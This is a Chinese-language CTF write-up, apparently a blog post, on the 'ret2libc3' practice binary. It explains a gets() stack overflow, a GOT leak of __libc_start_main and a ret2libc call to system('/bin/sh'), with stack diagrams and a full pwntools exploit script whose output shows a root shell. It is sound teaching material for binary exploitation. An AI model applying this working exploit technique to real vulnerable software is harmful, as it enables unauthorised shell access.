---
title: "ret2libc"
date: 2019-02-25T15:16:23+08:00
tags: [""]
categories: ["工具使用接口", "CTF-WriteUp"]
---


## 保护等级

首先检查保护等级：

```bash
$ checksec ret2libc3
[*] '/mnt/d/program/ctf/ctf-wiki/ret2libc3/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看到这是一个开启了部分只读和栈溢出保护的程序。

## 程序逻辑

在 `Ida Pro` 中打开即可看到 `main` 函数的伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No surprise anymore, system disappeard QQ.");
  printf("Can you find it !?");
  gets(&s);
  return 0;
}
```

可见这是一个相当明显的栈溢出。`0x64` 个字节就能覆盖到原 `EBP`、`0x68` 就能覆盖到返回地址。

## 利用

查找字符串和 `system` 函数之后发现都没找到。那么我们如何得到 system 函数的地址呢？

- `system` 函数属于 `libc`，而 `libc.so` 动态链接库中的函数之间相对偏移是固定的。

- 所以如果我们知道 `libc` 中某个函数的地址，那么我们就可以确定该程序利用的 `libc`。进而我们就可以知道 `system` 函数的地址。

那么如何得到 `libc` 中的某个函数的地址呢？

- 我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。
- 当然，由于 `libc` 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址，通常选取的函数是 `__libc_start_main`，这是因为它是程序最初被执行的地方。

*PostScript*: 关于 `PLT` 表与 `GOT` 表的关系可以参考 [LIEF](<https://lief.quarkslab.com/doc/stable/tutorials/05_elf_infect_plt_got.html>)

### `leak_libc_main`

我们将控制 `main` 函数溢出后，其栈帧形成下面的形式：

```
                   +----------------+                                   
                   |                |                                   
              0x64 | local variable |-----> 'A'*0x64                    
                   |                |                                   
                   +----------------+                                   
               0x4 | previous $ebp  |-----> 'A'* 0x4                    
                   +----------------+                                   
               0x4 | return address |-----> "puts" address              
                   +----------------+                                   
                                    ------> "main" address              
                                                                        
                                    ------> .got.plt:"__start_libc_main"
```

实际上执行的是这样一个函数 `puts("__start_libc_main")`。

### `get_shell`

因为上面的的栈帧控制，我们可以再执行一次 `main` 函数，经过之前的泄露我们可以得到 `libc` 的加载基地址，因此可以得到 `system` 的地址，从而可以执行系统调用拿到 `shell`：

```
                   +----------------+                        
                   |                |                        
              0x64 | local variable ------> 'A'*0x64         
                   |                |                        
                   +----------------+                        
               0x4 | previous $ebp  ------> 'A'* 0x4         
                   +----------------+                        
               0x4 | return address ------> "system" address 
                   +----------------+                        
                                    ------> 'A'* 0x4         
                                                             
                                    ------> "/bin/sh" address
```

实际上执行的是这样一个函数 `system("/bin/sh")`。

### 脚本

```python
#!/usr/bin/env python2
# coding=utf-8
from pwn import *


class Challenge:
    libc_main_addr = 0x1AA50
    libc_system_addr = 0x3E9E0
    libc_binsh_addr = 0x17EAAA

    def __init__(self):
        self.p = process(["./ret2libc3"])
        self.elf = ELF("./ret2libc3")

    def leak_libc_main(self):
        puts_addr = self.elf.plt["puts"]
        libc_main_addr = self.elf.got["__libc_start_main"]
        main_symbol = self.elf.symbols["main"]
        # todo 我也不知道为什么是 0x70 的偏移，按反汇编结果应该是 0x68 才对。栈结构：
        #       _puts 地址(第一次 main 返回地址)==>_puts 返回地址(第二次 main 地址)==>_puts 参数(got["libc_main"])
        payload = flat(['A' * (0x6c + 0x4), puts_addr, main_symbol, libc_main_addr])
        self.p.recvuntil("Can you find it !?")
        self.p.sendline(payload)
        self.leak_main_addr = u32(self.p.recv()[:4])
        print("__libc_start_main: %s" % hex(self.libc_main_addr))

    def get_libc_offset(self):
        self.libc_base = self.leak_main_addr - self.libc_main_addr
        print("libc offset: %s" % hex(self.libc_base))

    def get_shell(self):
        system_addr = self.libc_base + self.libc_system_addr
        bin_sh_addr = self.libc_base + self.libc_binsh_addr
        payload = flat(["A" * (0x64 + 0x4), system_addr, "A" * 0x4, bin_sh_addr])
        self.p.sendline(payload)
        self.p.interactive()

    def pwn(self):
        self.leak_libc_main()
        self.get_libc_offset()
        self.get_shell()
        self.p.wait_for_close()


if __name__ == "__main__":
    c = Challenge()
    c.pwn()
```

执行结果：

```bash
$ python exp.py 
[+] Starting local process './ret2libc3': pid 6456
[*] '/tmp/pycharm_project_477/ret2libc3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
__libc_start_main: 0x1aa50
libc offset: 0xf7d55000
[*] Switching to interactive mode
$ whoami
root
```


